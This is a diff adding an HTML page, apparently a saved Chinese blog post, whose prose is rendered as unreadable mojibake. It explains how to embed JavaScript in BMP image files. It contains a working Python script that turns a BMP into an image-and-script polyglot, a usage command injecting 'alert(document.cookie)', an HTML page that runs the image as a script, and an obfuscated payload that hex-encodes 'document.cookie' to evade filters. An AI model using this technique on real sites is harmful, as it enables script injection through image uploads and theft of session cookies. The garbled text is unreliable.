@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>ͼƬ����-BMPͼƬ��ע������JS���� - ̼��������־ - ���ײ���</title>
+<link rel="stylesheet" href="../css/article.css" />
+</head>
+<body>
+<div class="m-content">
+<h1>ͼƬ����-BMPͼƬ��ע������JS���� - ̼��������־ - ���ײ���</h1>
+<div><p><span>Ҳ�����������е�JS���룬�����൱��Ȥ��</span></p><div><p><span><b>ִ��JSע���Ľű�</b></span></p><p>����</p><p>1. ��ԭBMP�ļ��ĵ����������ֽ��滻<b>Ϊ<span>\x2F\x2A</span></b>�� ��Ӧjs�е�ע�ͷ���<b><span>/*</span></b></p><p><span>BMP�ļ��ĵ������ġ��塢���ֽڱ�ʾBMP�ļ��Ĵ�С</span></p><p>2. ��BMP�ļ�ĩβ����</p><p>��1��<b>\xFF</b></p><p><b>��2��<span>\x2A\x2F</span></b>,<span>��Ӧ��js�е�ע�ͷ���<b><span>*/</span></b></span></p><p><b>��3��<span>\x3D\x31\x3B</span></b>,��Ӧ��<b><span>=1; </span></b>&nbsp;��Ϊ��α����BMP��ʽ</p><p>��4�����Ƶ�JS����</p><div><pre><p>#!/usr/bin/env python2.7<br />import os<br />import argparse<br />def injectFile(payload,fname):<br />f = open(fname,"r+b")<br />b = f.read()<br />f.close()</p><p>f = open(fname,"w+b")<br />f.write(b)<br />f.seek(2,0)<br />f.write(b'\x2F\x2A')<br />f.close()</p><p>f = open(fname,"a+b")<br />f.write(b'\xFF\x2A\x2F\x3D\x31\x3B')<br />f.write(payload)<br />f.close()<br />return True</p><p>if __name__ == "__main__":<br />parser = argparse.ArgumentParser()<br />parser.add_argument("filename",help="the bmp file name to infected")<br />parser.add_argument("js_payload",help="the payload to be injected. For exampe: \"alert(1);\"")<br />args = parser.parse_args()<br />injectFile(args.js_payload,args.filename)</p></pre><br /></div></div><p><b><span>��ʾ</span></b></p><p>������ʾʵ��Ч��</p><div><div><p><span>���нű�</span><span>����ָ����JS����д�뵽������BMPͼƬ��</span></p><div><p>��ʽ��python �ű��� -i ����BMP��ʽͼƬ JSPayload</p><div><pre><p>python <span>BMPinjector.py</span><span> -i 1.bmp "alert(document.cookie);"</span></p></pre></div></div><p>��ʾҳ��run.html</p><div><pre><p>&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Opening an image&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;img src="1.bmp"\&gt;
+&lt;script src="1.bmp"&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</p></pre></div></div></div><p>&nbsp;<span>���� http://xxx/run.html</span></p><p>Ҳ���Բ���js�������ƹ�����,�õ�������һ����Ч��</p><div><pre><p>python BMPinjector.py -i 1.bmp "var _0x9c4c=\"\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\"; function MsgBox(_0xccb4x3){alert(eval(_0xccb4x3));} ;MsgBox(_0x9c4c);"</p></pre></div><p><span>ע�⣺\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65��Ӧdocument.cookie</span></p><p>�ο���</p><p>http://marcoramilli.blogspot.com/2013/10/hacking-through-images.html</p></div></div>
+</body>
+</html>
